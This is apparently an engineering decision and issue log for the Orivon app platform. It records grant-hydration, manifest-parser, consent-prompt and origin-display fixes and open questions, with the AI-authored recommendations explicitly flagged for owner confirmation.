> `src/loader/tests/electron-serve.test.ts`'s "restorePinnedServing across a restart" suite,
> against a real `GrantLedger`/`createBroker`/`LedgerStorage`, not a stub: a real, persisted
> `tcp.connect` grant widens the FIRST served document's `connect-src` with no registerApp call
> ("A158 RESOLVED FOR connect-src"); the equivalent `https.connect` case widens `img-src`/
> `font-src`/`media-src` the same way; a real third-party fetch to the granted host through the
> live handler actually SUCCEEDS (200, not 404) on the very first request ("THE LIVE GATE ALSO
> WORKS, NOT JUST THE HEADER"); `broker.app.grants` itself -- the same read a live capability
> check performs -- already holds both grants before any `registerApp` call ("THE GRANT IS LIVE,
> NOT JUST DISPLAYED"); a later real `registerApp` with a manifest that drops the capability
> entirely still wins ("THE OWNER'S POINT, END TO END"); and an origin with no pin, or one whose
> pin fails re-verification, gets nothing hydrated and stays exactly as narrow as before this lane.
>
> **A pre-existing, independent bug was found and fixed along the way, not by this lane's own
> design but because it blocked verifying this fix honestly.** Building a REAL pinned manifest that
> declares `https.connect` (needed so `hydrateFromPinnedManifest`'s re-validation has something
> genuine to check against, rather than a manifest and a grant that merely happened to agree by
> construction) hit `src/loader/manifest-capabilities.ts`'s `readNet`, which had never implemented
> `net.https` at all -- `NET_KEYS` listed only `tcp`/`udp`/`concurrentSockets`, so ANY manifest
> declaring `https.connect` was rejected outright by `parseManifest`, both at install
> (`fetch-bundle.ts` calls the identical function) and every time a pinned bundle's manifest is
> read back. Filed and fixed as **A164** below -- every existing test exercising `https.connect`
> injected the grant as a raw callback, never through a real declared-and-parsed manifest, which
> is exactly why this had no test that could have caught it.
>
> Verified: `src/broker/grants/tests/grant-ledger-pin-hydration.test.ts` (the `GrantLedger`
> contract in isolation -- idempotence, the no-op-once-registered case, the fresh-GrantId rule, the
> owner's own narrowing/dropping scenario), `src/loader/tests/serve.test.ts`'s `verifiedManifestFor`
> suite, and the `electron-serve.test.ts` suite named above.

### A159 -- `scripts/smoke.mjs` leaked its temp profile on every run, and the file is now exactly at its line ceiling **[RESOLVED 2026-09-14 in part; the ceiling is STILL OPEN]**

**Found 2026-09-14** by the clean-checkout verification lane (V-clean), which was looking for
something else entirely -- it noticed a `/tmp/orivon-test-*` directory surviving a run that had
otherwise passed.

**The leak, now fixed.** `scripts/smoke.mjs` tore down with a bare Playwright `app.close()` instead
of `test/launch-electron.mjs`'s shared `closeElectron()`. Only `closeElectron`'s own `finally`
removes the temp `--user-data-dir` that `launchElectron` created, and `launch-electron.mjs`'s own
comments already said so in as many words. So every smoke run -- **passing or failing** -- left
roughly 5 MB behind. Every e2e test file already went through the shared helper for exactly this
reason; the smoke script was the one caller that did not.

This is the mechanism behind a machine-health problem the owner has already been bitten by once:
leftover profiles accumulating until the disk and the desktop filled. The conductor removed five of
them (18 MB) earlier the same night without yet knowing why they kept appearing.

**What is NOT fixed, and is the more interesting half.** `scripts/smoke.mjs` is now at **exactly
800 lines, its Rule 2 ceiling, with zero slack.** Fixing a one-line bug required three attempts to
fit: a five-line comment explaining why the bare `close()` is wrong (which is precisely the comment
that would have prevented this bug) did not fit, and the explanation had to be compressed onto the
end of the line it protects.

**That is the ceiling working as designed and also telling us something.** Rule 2's own text says
to split by concern and never by line count, and `foo-part2.mjs` would be worse than the long file.
But a file that cannot absorb a two-line comment is a file where the next correct change is a
split, and doing that as a side effect of a bug fix -- at 01:00, in a script whose whole job is to
be the last line of defence before a release -- would have been the wrong trade.

**AI recommendation:** split `scripts/smoke.mjs` by scenario before the next change to it. The
natural seam is already visible in the file -- the journeys are independently numbered and
sequential, and `test/smoke-helpers.mjs` already exists as the destination for shared machinery.
Not urgent; it becomes urgent the moment anyone needs to add a check.

**Needed by:** the next change to `scripts/smoke.mjs`, whatever it is.

### A160 -- should `src/shim/` reusing `src/shim-electron/unimplemented.ts` directly, rather than via `src/shared/`, be confirmed by the owner **[AI-REC -- proceeded without owner sign-off, flagging for confirmation]**

**Raised 2026-09-14**, `stream/shim-12-named-refusals`, while closing A135 (the shim's
"refuse by name, not absence" fix, extended from `src/shim-electron/` to `src/shim/`).

**The call made, stated precisely.** `src/shim/unimplemented.ts` imports `refusingProxy` directly
from `src/shim-electron/unimplemented.ts`, generalised so `classify` returns the `Error` to throw
rather than a record `shim-electron` used to convert via a hardcoded `refuse()` call.
`src/shared/` -- the directory `CLAUDE.md` and its own README describe as existing specifically
for a helper needed on the `src/broker/` <-> `src/shim/` trust boundary -- was considered and
rejected: `src/shim-electron/` sits on the same side of that boundary as `src/shim/` (both
renderer-only, no broker access, already named sibling adapter families in
`compatibility-matrix.md` Table 2), so this did not read as the crossing that directory exists
for. Nothing in either package's own "must never import" list forbids this direction --
`src/shim-electron/README.md`'s list forbids only the reverse (importing `src/shim/` back).

**Why this needs a look rather than standing as settled.** `src/shared/README.md` states its own
bar as "two callers on opposite sides of a boundary. Not one." and lists its known-candidates
section as empty specifically because a prior audit found nothing in the tree actually crossing
the `src/broker/`/`src/shim/` boundary. This PR is the first time anything in `src/shim/` has
taken a dependency on `src/shim-electron/` at all (previously "an app imports `net`/`fs` from one
and `electron` from the other... neither depends on the other" -- `src/shim-electron/README.md`,
corrected in this same PR). That is a new coupling between two directories `parallel-work.md`
currently lists as separately owned, and Rule 1 (`CLAUDE.md`) says a load-bearing, reversible-
only-at-cost choice gets an ADR rather than a silent promotion -- this is reversible fairly
cheaply (the generalised `refusingProxy` has zero dependency on either package's error type, so
moving it to `src/shared/` later is a mechanical follow-up, not a rewrite), which is why this was
judged not to rise to ADR weight, but the judgment itself was not put to the owner before landing.

**AI recommendation:** confirm this reading of `src/shared/`'s scope (two specific, named
directories forbidden from importing each other for a security reason, not "any two directories
that happen not to import each other yet"), or say otherwise and this moves to `src/shared/` in a
follow-up, own PR, per its own change-control rule.

**Needed by:** whoever next reviews `stream/shim-12-named-refusals`, or the next time something
else in `src/shim/` or `src/shim-electron/` wants to depend on the other.

### A161 -- a fixed three-label origin display still hides the tenant behind a multi-label PRIVATE suffix (cloud/PaaS hosting) **[STILL OPEN -- narrow, not blocking]**

**Raised 2026-09-14**, `stream/shell-06-three-label-origin`, verifying the owner's "last three
labels" rule (`formatOriginForDisplay`, `src/main/grant-prompt-render.ts`) against real
multi-part suffixes before shipping it, per that lane's own brief.

**The rule is correct for what it was built to fix.** A142 (resolved by the same lane) was about
ccTLD-style registry suffixes -- `.co.uk`, `.co.jp`, and the rest -- which are one or two labels,
so three labels always leaves the true registrant visible. Checked directly against the live
Public Suffix List, not assumed: the *private* section (platforms, not registries) contains fixed,
non-wildcard suffixes longer than that. `s3.amazonaws.com` is itself a three-label suffix; AWS's
own regional compute suffixes run to four (`ap-northeast-1.compute.amazonaws.com`, confirmed in
the list as published, via AWS's own PSL-contribution fork). A tenant name sits to the LEFT of a
suffix that long.

**Concretely:** an Orivon app served from `accounts.google.com.attacker.s3.amazonaws.com` -- a
legal S3 bucket name, since bucket names may contain literal dots -- displays as
`...s3.amazonaws.com` under the current rule. That is a real, well-known AWS domain, and the
entire tenant-controlled label -- including a same-shaped confusable payload to A115's own
worked example, just relocated one level further left -- is dropped rather than shortened. This
is a materially different failure from "shows too little": it shows a string that reads as
*more* trustworthy than the truth, because the visible remainder names a platform, not the
untrusted party actually serving the page.

**Why this is filed separately from A142 rather than reopening it.** A142 was specifically about
ccTLD registry suffixes, and three labels closes that case by construction -- correctly, with no
suffix list needed. This is a different shape (a private suffix whose own length varies by
platform, 1 to 4+ labels, with no small fixed count that is simultaneously right for `google.com`,
`example.co.uk`, and `compute.amazonaws.com` at once) that no fixed label count can close, three
or otherwise -- closing it for real needs exactly the public-suffix-list lookup A142 avoided
adding, now for a different reason: not to avoid a wrong guess, but because "how many labels does
this suffix have" is genuinely platform-dependent data, not a constant.

**Scope check, so this is not overstated.** This needs an app actually hosted directly on a
private-suffix cloud domain with a crafted tenant name -- most real deployments sit behind their
own registered domain, where the three-label rule is exactly right. Nothing in this codebase
currently resolves or displays an app's *hosting* platform separately from its origin, so this is
a latent gap in the display, not a demonstrated live exploit against anything built so far.

**AI recommendation:** leave the three-label rule as shipped -- it is a strict improvement over
both "no elision" and the character-count rule it replaced, for the near-total majority of real
origins -- and treat a public-suffix-list dependency as the eventual fix for both this and the
"count distinct registrable domains" want noted in `src/main/README.md`'s Design notes, reviewed
together rather than added twice. **Still open:** whether this is worth a dependency review before
100 real users are onboarded, or can wait for a concrete report against it.

**Needed by:** whenever the owner is ready to review a public-suffix-list dependency for real
(A142's parked `psl`/`tldts` evaluation applies unchanged), or sooner if an app is ever actually
served from a multi-label private suffix.

### A163 -- third-party reach (A143) only proxies `https:`; a plain `http:` cross-origin request inside an app's own partition stays denied **[AI-REC -- not an owner decision]**

**Raised 2026-09-14**, lane F-reach, while deciding how `fetchThirdParty` (`src/loader/serve.ts`)
should authorise a cross-origin request `A143` newly lets through to the real network.

`ADR-0017`'s own routed `fetch()` (`src/preload/fetch-route.ts`) already splits on scheme:
`https:` goes through `orivon.net.connectSecure` (`https.connect`, hostname-bound by the TLS
handshake itself), `http:` goes through `orivon.net.connect` (`tcp.connect`, resolved-address-bound
by `checkConnect`'s own "resolve once, check every answer" discipline). `fetchThirdParty` mirrors
only the first half. A plain `http:` cross-origin request inside an app's own partition -- an
`<img src="http://...">`, a raw (non-routed) `XMLHttpRequest` -- is refused outright, regardless of
what `tcp.connect` the app holds.

**Why, stated precisely rather than asserted.** `checkConnect`'s own security property depends on
dialling the EXACT resolved literal the check just validated, never re-resolving the hostname
afterwards (`connect.ts`'s own header: "RESOLVE ONCE, check EVERY address that came back, and hand
the caller the validated literals to dial"). `fetchThirdParty`'s actual network I/O
(`serve-reach.ts`'s `nodeReachDial`) is Node's own `https` module, dialling by HOSTNAME -- there is
no way to hand it a pre-validated literal address while keeping the real hostname for the
connection and the `Host` header. Authorising a plain request here would therefore check one
address (at grant-authorisation time) and could legitimately connect to a DIFFERENT one moments
later if the name's DNS answer changes in between (T12, DNS rebinding) -- the check and the
connection would be resolving independently, reopening exactly the gap `checkConnect`'s own design
exists to close.

**This is the SAME limitation `electron-fetch.ts`'s own A66 already names** ("neither `net.fetch`
nor `net.request` exposes a way to pin a request's underlying connection to a specific resolved
address while keeping the real hostname for TLS SNI/the Host header") -- confirmed there against
Electron's API surface, and true of Node's `https` module for the identical reason (neither
exposes per-request DNS pinning). `A66` accepted this gap for `electronFetch`'s own narrow case: a
SINGLE, address-literal-constrained fetch of an app's OWN declared install origin, re-resolved
and re-checked immediately before each use, for up to `BUNDLE_TIMEOUT_MS`. **This lane judged that
narrow acceptance does not transfer to `fetchThirdParty`'s own surface**, which is general and
repeatable and can be pointed at any hostname a page's own markup or script names -- exactly the
"attacker who can get a URL into the page" threat model this whole feature has to survive. AI
recommendation, not an owner decision: keep `http:` denied until either Electron/Node exposes a
pinning hook this gap could close with, or an owner decides the risk is acceptable for a stated,
narrower reason the way `A66` was.

**What this costs today:** nothing measured -- no fixture or flagship app in this MVP references a
plain-http cross-origin resource from inside its own partition, and `ADR-0017`'s own mixed-content
note already means an `https:`-origin app's browser-level requests to `http:` targets are refused
by Chromium's own mixed-content blocking before they would ever reach this handler regardless.

**Needed by:** whichever future app actually needs a plain-http cross-origin resource from inside
its own partition -- not before.

### A162 -- honouring `consentGranularity: 'per-capability'`: the install prompt is built, the three update prompts are not **[AI-REC -- needs-owner-decision]**

**Raised 2026-09-14**, lane `F-granular` (`stream/shell-09-per-capability-consent`), closing
A138's contracts-only landing (PR #192) with a real implementation.

**Part 1, urgent and self-contained, landed first.** `src/loader/manifest.ts`'s `readManifest`
rejects any field its `MANIFEST_KEYS` allowlist does not name -- and that allowlist never learned
`consentGranularity` when PR #192 added it to `Manifest`. Any app author who read the contract,
added the field, and shipped it got refused at install with "manifest has an unrecognised field",
blaming them for using the interface as documented. Fixed: the field is now recognised, validated
against exactly the two `ConsentGranularity` literals, and an absent field is left out of the
parsed manifest entirely (the contract's own "omitted means `'all-or-nothing'`" is a fact for a
CALLER to apply, never a value this parser invents). No app exists yet, so nothing broke in the
wild, but this sat on `main` since #192 merged and needed to stop sitting there.

**Part 2, built for exactly one surface: the install-time consent dialog
(`src/main/install-consent.ts`, `d-0025`).** A manifest declaring `'per-capability'` now gets a
real choice: a staged native-dialog sequence (`createPerCapabilityConsentPrompt`,
`src/main/install-consent-prompt.ts`) -- one overview offering "Allow all" / "Choose
individually" / "Deny all", and only for the middle choice, one Allow/Deny dialog per capability
(`describeCapabilityChoice`, `src/main/grant-prompt-choice.ts`), each screen printing the WHOLE
outstanding request as context so choosing individually never loses the whole picture. Every
grant still goes through `decideGrantRequest` (via the existing `grantChangedCapabilities`,
untouched); a refusal of one capability never refuses the app; the accepted subset is filtered
defensively back to what was actually asked before anything is granted, so a misbehaving prompt
cannot widen a grant even in principle. `requestInstallConsent`'s own "once, ever" gate is
generalised from two whole-set checks (all held / all declined) to one OUTSTANDING filter
(covered by neither), which collapses back to the old behaviour exactly whenever the old mixed
state cannot occur -- proven by the full pre-existing `install-consent.test.ts` suite passing
unmodified. Full design reasoning (why staged-native over a self-rendered window, why the two
prompts see different capability sets, what a partial refusal does to the remembered-decline
record) is in `src/main/README.md`'s Design notes -- not repeated here.

**What this does NOT cover, on purpose, and is this entry's own open half.** `src/main/
update-outcomes.ts` drives THREE other prompts -- `reconsentPrompt`, `capabilityPrompt`
(`needs-capability-prompt`: an installed app's UPDATE asking for more than it already holds), and
`rollbackChoicePrompt` -- all still plain booleans, regardless of `consentGranularity`. The most
analogous case is `capabilityPrompt`: an app widening its declared capabilities on update is
structurally the same shape as a first install (`describeCapabilityPrompt` already shares
`describeCapabilitySet` with `describeInstallConsent` -- one vocabulary, Rule 3), so it is the
natural next candidate for the same staged treatment. It was not built here: `driveLoadResult`'s
`'needs-capability-prompt'` case calls `grantChangedCapabilities` directly with no
declined-consent bookkeeping at all today (a PRE-EXISTING gap, not introduced by this lane), so
wiring per-capability choice into it means deciding that bookkeeping too, not just swapping a
prompt type -- real engineering against a second call site, not a mechanical extension.

**AI recommendation, not an owner decision, `needs-owner-decision`:** (1) confirm the staged
native-dialog surface (rather than a self-rendered privileged window) is the right floor for
per-capability consent -- the PR body pastes its literal rendering for exactly this review; (2)
decide whether `capabilityPrompt`'s update-time widening deserves the same per-capability
treatment, and if so, whether the same "outstanding" gate and declined-consent record should
extend to it or use its own.

**Needed by:** whenever the owner reviews this lane's PR, the natural moment to also settle
whether the update-time widening path should match.

### A164 -- `src/loader/manifest-capabilities.ts` never implemented `net.https`, so a manifest declaring `https.connect` was rejected outright, at install and at every serve **[RESOLVED 2026-09-14 -- lane G-hydrate]**

**Raised and fixed 2026-09-14**, lane `G-hydrate`, closing `A158`. Not something this lane set out
to find: `A158`'s own fix needed a test that pins a REAL bundle whose manifest actually declares
`https.connect` (`GrantLedger.hydrateFromPinnedManifest` re-validates a restored grant against
exactly that manifest, so a fixture that let the pinned manifest and the grant merely agree by
construction, rather than by being read through the real parser, would not have exercised the real
mechanism at all). Building that fixture hit the bug directly.

**The bug, precisely.** `contracts/manifest.ts`'s `NetCapability` has declared
`readonly https?: HttpsCapability` since `ADR-0017`, and the BROKER side is fully wired for it
(`src/broker/policy/request-grant.ts`'s `CONNECT_SHAPED_CAPABILITIES`, `manifest-patterns.ts`'s
own `secureConnect` line, which even carries a comment about a PRIOR bug in the same neighbourhood:
"ADDED https.connect went undetected by decideUpdate()'s subset check"). But
`src/loader/manifest-capabilities.ts`'s `readNet` -- the LOADER's own, independent manifest
parser -- never learned about it: `NET_KEYS` listed only `['tcp', 'udp', 'concurrentSockets']`, so
`extraKey(raw, NET_KEYS)` rejected any manifest with a `net.https` field as an "unrecognised
field", unconditionally. `parseManifest` is called from exactly two places, both load-bearing:
`fetch-bundle.ts` (install time) and `serve.ts`'s `createAppRequestHandler` (every time a pinned
bundle is served). So a manifest declaring `https.connect` could not be installed, and if somehow
already pinned before this bug, could not be served either -- the entire capability was
unreachable through any real app, only through a test that injects the grant as a raw callback and
never parses a manifest at all, which is exactly what every existing test that exercises
`https.connect` (`serve.test.ts`, `electron-serve.test.ts`, pre-this-lane) did. No manifest field
introduced since `ADR-0017` had a test that actually round-tripped it through the real parser.

**Fixed directly, not filed for later**, because it blocked verifying `A158`'s own fix honestly:
`readNet` gained a `readHttps` (mirroring `readTcp`'s own `connect` field, reusing
`validateConnectPattern`/`validateConnectHost` rather than a second grammar -- Rule 3), `NET_KEYS`
now lists `https`. `src/loader/tests/manifest-capabilities.test.ts`'s new
`capabilities.net.https.connect (A164)` suite proves it parses (including `"*:*"`, ADR-0017's
unlimited-HTTPS declaration), sits alongside `tcp`/`udp`/`concurrentSockets` without disturbing
them, and still rejects the same malformed patterns and unrecognised sibling fields every other
capability reader does.

**Independent of `A158`'s own mechanism** -- this is a parser gap that would have existed and
mattered whether or not early hydration was ever built. Recorded here rather than only in a commit
message because `CLAUDE.md` Rule 3 (contradictions get surfaced) applies to a silent capability
gap as much as to a stated disagreement, and because the next person adding a `NetCapability`
field should know this file's allowlist does not grow itself.

### A165 -- an automatic check now fails CI when `src/contracts/manifest.ts` declares a field the loader will not accept, closing the failure mode behind A164 and the `consentGranularity` gap **[RESOLVED 2026-09-14 -- lane G-parity]**

**The failure mode, named once rather than per incident.** `src/loader/manifest.ts` and
`manifest-capabilities.ts` reject any manifest field they do not recognise, using hand-maintained
allowlists (`MANIFEST_KEYS`, `CAPABILITIES_KEYS`, `NET_KEYS` and their siblings). Twice in one day
-- `Manifest.consentGranularity` (closed in a follow-up before this lane started) and `A164`'s
`NetCapability.https` -- a field landed in the contract with no matching update to the loader's
own allowlist, so an app author reading the published interface and using it as documented was
refused at install, blamed for a gap that was never theirs. Both compiled clean and both sides'
own tests passed; the gap only ever surfaced when something tried to parse a real manifest.

**The mechanism.** `scripts/check-manifest-parity.mjs`, wired into `npm run check:manifest-parity`
and CI's `check` job alongside the other `check:*` guards. It reads `Manifest`, `Capabilities`,
`NetCapability`, `TcpCapability`, `UdpCapability`, `HttpsCapability`, `FsCapability` and
`IdCapability` straight out of `src/contracts/manifest.ts`'s own source text (`interfaceFields`),
and reads the loader's real `*_KEYS` array literals straight out of its source text
(`arrayLiteralItems`) -- both sides derived from the files that actually ship, never copied into
a third hand-typed list, which is the trap a naive version of this check would have been:
comparing one hand-written list against another is just a third list to forget. Any contract field
absent from its corresponding loader array fails the check, naming the exact interface and field.

**Distinguishing "not yet built, on purpose" from "forgotten".** A field the loader deliberately
does not accept yet is not a bug, but this check cannot infer that on its own -- it has to be told,
so it does not guess. `DELIBERATELY_DEFERRED` in the same script is the place that record lives,
one entry per field, each with a required `reason`. It is empty today: every field either
interface currently declares is already accepted, following `A164`'s fix and the
`consentGranularity` fix. The next person who adds a contract field before the loader is ready for
it adds a row there, with why, or this check fails on their branch -- which is the intended
outcome, not a false positive.

**Also landed: a round-trip regression test**, `src/loader/tests/manifest-contract-parity.test.ts`
-- worth having independent of the check above, since it exercises the real `parseManifest` rather
than a description of it. It types one "kitchen sink" manifest against `Required<Manifest>` (and
`Required<>` on every nested capability interface), so a future field added anywhere in that chain
without updating the fixture is a `npm run typecheck` failure, not a silent gap; the fixture is
then run through the real parser and asserted accepted and round-tripped unchanged.

**Verified against both historical defects directly**, not just by construction: with `https`
removed from `NET_KEYS` in a scratch copy of the real files, the check fails naming
`NetCapability.https`; with `consentGranularity` removed from `MANIFEST_KEYS`, it fails naming
`Manifest.consentGranularity`. Both restores leave `git status` clean. Pasted into the PR body
verbatim, not just asserted.

**What this does not cover, on purpose (scope discipline, `CLAUDE.md` Rule 7).** It checks field
*names* only, one level of allowlist at a time -- not value grammars (a pattern string, a port
range, a curve name), not runtime accept/reject behaviour for a given value, and not a brand-new
capability interface that needs an entirely new `*_KEYS` array and a new row in the check's own
`PARITY_MAP` (a structural addition on both sides, not the silent-drift failure mode this exists
for). It also does not check the reverse direction -- the loader accepting a key the contract no
longer declares -- since that is a different bug class from the one that hit three times today and
was out of scope for this lane.

### A168 -- a handle acquired under a pin-hydrated grant outlived it: `revoke`/`revokePersisted` could not find it under either the old or a superseded id **[RESOLVED 2026-09-15 -- lane FIX-1]**

**Raised 2026-09-15** by an adversarial review lane against A158's hydration seam, confirmed by
the conductor re-verifying the whole chain by hand before assigning the fix.

**The gap, precisely.** `hydrateFromPinnedManifest` (A158) deliberately does not set
`grantsHydrated`, so it is always superseded by the first REAL `registerApp` for the same origin.
That later `registerApp` call still saw `grantsHydrated` false and ran `replaceHydratedGrants`
again -- which minted a BRAND-NEW `GrantId` for every capability, even one whose restored
patterns had not changed at all. A handle's `authorisedBy.grantId`
(`src/broker/handles/handle-store.ts`) is frozen at acquire time and never rebinds, and
`HandleTable`'s revocation cascade (`src/broker/handles/handles.ts`) indexes by that frozen id
(`byGrant`). So: a restored app opens a socket under the pin-hydrated grant `G1`; the page's own
manifest hint triggers the first real `registerApp`, which re-mints the same authority as `G2`;
the user clicks Revoke; the ledger row for `G2` disappears; the socket, still filed under `G1`,
is never touched. The revoke button lied. A sibling of `A84`/`A70`, in the same subsystem, found
the same way -- by hand-verifying a hydration/handle-identity interaction rather than trusting
that a green suite meant the cascade actually ran.

**Why the existing suite could not see it.** Every `hydrateFromPinnedManifest` test
(`grant-ledger-pin-hydration.test.ts`) exercised `GrantLedger` alone, with no `HandleTable` in the
picture at all -- so a re-minted id with no live handle under it looked identical to a re-minted
id that quietly orphaned one. Nothing in the suite ever acquired a handle between the two
hydration calls.

> **Resolved 2026-09-15, lane FIX-1.** Two halves, neither correct alone:
>
> **Half 1 -- do not re-mint unchanged authority.** `grant-persistence.ts`'s
> `replaceHydratedGrants` now compares each newly-restored capability's patterns against
> whatever `grants` already held for it, using the same order-independent `sameOwnPatterns`
> check `src/main/grant-changed-capabilities.ts` already used for the identical reason one layer
> up (A156) -- moved into `src/broker/policy/update.ts`, not duplicated a third time, since
> `src/broker/` may never import `src/main/` and the shared copy had to live on the broker side.
> A set-equal match reuses the EXISTING `Grant` object, id included, instead of the fresh one
> hydration minted for it.
>
> **Half 2 -- when authority DID change, the superseded grant's handles are torn down.**
> `GrantLedger` has no `HandleTable` reference (README.md's own class doc), so it cannot cascade
> by itself. `replaceHydratedGrants` now returns a `SupersededGrant[]` -- every capability
> `grants` held before the call that was either dropped outright or replaced with a genuinely
> different pattern set, paired with its OLD id. `GrantLedger.hydrateFromPinnedManifest` and a
> new `hydrateGrantsOnFirstRegistration` (the hydration branch pulled out of `registerApp`, so
> `createBroker` can call it separately and still receive this list even if `registerApp`'s own
> version-floor write throws afterward) both surface it. `createBroker`'s `registerApp` and
> `hydrateFromPinnedManifest` wrappers (`src/broker/index.ts`) cascade it through
> `handleTable.revoke`, unconditionally, matching the ordering `revokePersisted`/`grant`/`revoke`
> already use: ledger mutation first, cascade after, regardless of whether a disk write failed.
>
> **Proven by two tests that fail before the fix**, `src/broker/tests/
> index-hydration-grant-identity.test.ts`, both against the real `createBroker` surface (not
> `GrantLedger` alone, closing the coverage gap above): Half 1 -- a handle acquired under a
> pin-hydrated grant is still torn down by `revokePersisted` after a same-manifest
> `registerApp`; Half 2 -- a handle acquired under a WIDE pin-hydrated grant is torn down by a
> narrowing `registerApp` alone, with no explicit revoke call at all. Both time out waiting for
> `socket.closed` to reject against the unmodified code. Six further unit tests in
> `grant-persistence.test.ts` prove `replaceHydratedGrants`'s two halves directly (id reuse,
> order-independence, three distinct supersession shapes, the empty-`grants` baseline case).
>
> **Also in scope: `grant-ledger.ts`'s 500-line ceiling (`A177`).** This fix added to a file
> already at the limit with zero headroom, so `fsBytesWritten`/`reserveFsBytes`/
> `releaseFsBytes`/`socketAllowance` were pulled out into a new `resource-limits.ts`, continuing
> the same seam that already produced `grant-persistence.ts`/`update-safety.ts`/
> `declined-consent.ts`: a "how much may this origin use" concern, distinct from "what was this
> origin actually granted". `grant-ledger.ts` is 493 lines after this change.
### A167 -- three `src/contracts/` shapes landed (A114's delivery shape, the folder picker, `dns.lookup`) -- judgment calls inside each need confirming before the matching implementation lane starts **[AI-REC -- contracts landed this lane; confirm before build]**

**Raised 2026-09-15**, lane L0-contracts (`stream/contracts-05-listen-picker-lookup`), landing
three owner decisions from the same day -- `d-0028`, `d-0029`, `d-0030` -- as `src/contracts/`
types only. No implementation anywhere; that is this lane's own scope rule. Each shape below
carries real judgment calls beyond what the owner decision itself specified, flagged here rather
than left implicit in the type, so the lane that builds against it is confirming a documented
choice rather than reverse-engineering one from a diff.

**1. A114's delivery shape (`d-0028`) is now `src/contracts/ipc.ts`'s `AcceptedMessage`,
added to `BrokerToRendererMessage`.** It carries the accepted `TcpSocket`'s full synchronous
shape (`socketId`, `remoteAddress`, `remotePort`, `localAddress`, `localPort`) plus its `port`,
delivered over the `TcpServer`'s own port -- the shape A114 named and the owner chose, over a
second `PORT_CHANNEL` round trip per accept.

**Flagged, AI judgment, not owner-reviewed:** `port` is typed `MessagePort` -- the ambient DOM
type this file already relies on for `ReadableStream`/`WritableStream` without an import, and
the type a renderer genuinely holds once Electron completes the transfer. The **broker** side
constructs this message holding a real `MessagePortMain` (Electron-main-process, a different
class), and contracts cannot import `electron` to reference that type directly
(`check:contracts`). This is the same reason `src/broker/transport/port-transport.ts` and
`src/preload/socket-port.ts` already define two independently-shaped `PortLike` interfaces
rather than sharing one -- the concrete port class genuinely differs per process. The
implementing lane will hit a real type gap constructing this message on the broker side; the
call made here is to let contracts describe what the **renderer** receives (matching the type's
own name, `BrokerToRendererMessage`) and leave the broker-side adapter to do its own narrowing,
consistent with how `PortLike` already works. Flagging for confirmation rather than asserting it
is the only right answer.

**Also needed by that lane, not built here (implementation, out of this PR's scope):** both
`PortLike.postMessage` signatures (`port-transport.ts`'s `(message: BrokerToRendererMessage) =>
void`, `socket-port.ts`'s `(message: unknown) => void`) will need a transfer-list parameter --
today neither accepts one, and a `MessagePort`/`MessagePortMain` cannot cross a structured clone
without being named in one. Verified this lane's own change causes **no typecheck break** from
adding `AcceptedMessage` to the union itself: `npm run typecheck` (2026-09-15, this branch)
found none, and a direct grep for an exhaustiveness check over `BrokerToRendererMessage`/`.kind`
(`assertNever`, `: never`, a `Record` keyed on every kind) found none anywhere in the tree --
`src/preload/socket-port.ts` and `src/preload/datagram-port.ts` both `switch` on `message.kind`
with no exhaustiveness assertion, so a new member is silently unhandled there today, not a
compile error. The real work -- constructing, sending and receiving this message -- is entirely
unbuilt, matching A114's own "still open" status for the implementation half; only the shape
question A114 posed is answered by this lane.

**2. The folder picker (`d-0029`).** `capability-api.ts`'s `userSelected` is now overloaded on
the literal `directory` value: `userSelected(opts: { directory: true }): Promise<DirectoryHandle
| null>` alongside the existing file shape, `Promise<readonly FileHandle[]>`. `handles.ts` gains
`DirectoryHandle`, confined and revocable the same way `FileHandle` is, with the same method set
as `OrivonFs` minus `readFileSync` (justified only for the app's own startup-config reads) and
`userSelected` (no second dialog nested inside the first).

**Flagged, AI judgment:** (a) the directory shape resolves `DirectoryHandle | null` rather than
an array, on the reasoning that a folder picker's true cardinality is 0-or-1 and forcing an
array the file shape's own cancel-as-empty-array convention would otherwise imply is less honest
than the nullable, not more; (b) `multiple` was dropped entirely from the directory overload
(rather than accepted and ignored) since a native folder picker offers one folder per pick and a
silently-ignored option is its own small dishonesty; (c) `DirectoryHandle`'s method set mirrors
`OrivonFs` rather than the web platform's `FileSystemDirectoryHandle` traversal API (per-entry
handles, `entries()`/`keys()`/`values()`), on the reasoning that Orivon's own filesystem idiom --
a root plus relative paths, confined in the broker -- is already established by `OrivonFs`
itself and a second, differently-shaped filesystem interface for one handle type would cost more
than it buys. None of the three is a literal reading of `D-0007`, which specifies persistence
and revocability, not method shape or cancel semantics -- confirm before the broker lane that
builds `fs.open`/`fs.userSelected` (compatibility-matrix.md Table 4 row 6) takes this shape as
given.

**Also corrected in the same file, not new:** `handles.ts`'s `FileHandle` doc comment claimed
`userSelected` handles do "not survive an app restart either" -- true when written, reversed by
`D-0007` (2026-09-09) and left uncorrected since. Rewritten to state persistence and settings-
list revocability; the separate revocation-cascade exception (`fs` revocation does not close it)
is unchanged and was not what `D-0007` reversed.

**3. `dns.lookup` (`d-0030`, closing part of `A107`'s "not answerable by a shim" gap).**
`OrivonNet.lookup(opts: { hostname: string }): Promise<readonly LookupAddress[]>`
(`LookupAddress` in `handles.ts`: `{ address: string, family: 'IPv4' | 'IPv6' }`), bounded by
the app's own held network grant rather than a separate capability, per the owner's stated
reasoning (an unbounded resolver is a covert exfiltration channel to anywhere).

**Flagged, AI judgment, the one most worth owner eyes before it is built -- since resolved, see
below.** The owner decision states the BOUND ("as wide as the app's network grant already is")
but not which of the app's several possible grants count or how a bare hostname is matched
against a `host:port` pattern. This lane's ORIGINAL reading: `hostname` is checked against the
HOST portion of every pattern in the app's held `tcp.connect`, `https.connect` and `udp.send`
grants (manifest.js) -- the union of every OUTBOUND-reaching capability, not just one of them,
and not `tcp.listen`/`udp.bind` (inbound, no destination host to match against). The reasoning:
`connect`/`connectSecure`/`udpBind` already check a resolved or requested address against these
same patterns before any byte moves, so a lookup that matches one of them opens no route the app
could not already reach by name via that capability -- but this is this lane's inference from
the owner's stated principle, not a separately confirmed decision, and it is exactly the kind of
boundary-drawing CLAUDE.md Rule 2 says must not blur into "the owner decided this."

> **Confirmed, in part, and corrected, in part -- 2026-09-16, `d-0031`, lane
> `stream/broker-18-narrow-lookup-union` (A193).** An independent adversarial review (A190) found
> the `https.connect` third of this reading concretely wrong, not merely unconfirmed:
> `checkConnectSecure` never resolves a hostname at all (TLS certificate verification stands in
> for the address check `checkConnect` performs), so an `https.connect`-only app never had the
> pre-existing "force a resolution by attempting a connection" route this paragraph's own
> reasoning relies on. The owner's decision keeps the union argument for `tcp.connect` and
> `udp.send` (both do share that route -- `authorisedSend` reuses `checkConnect` verbatim) and
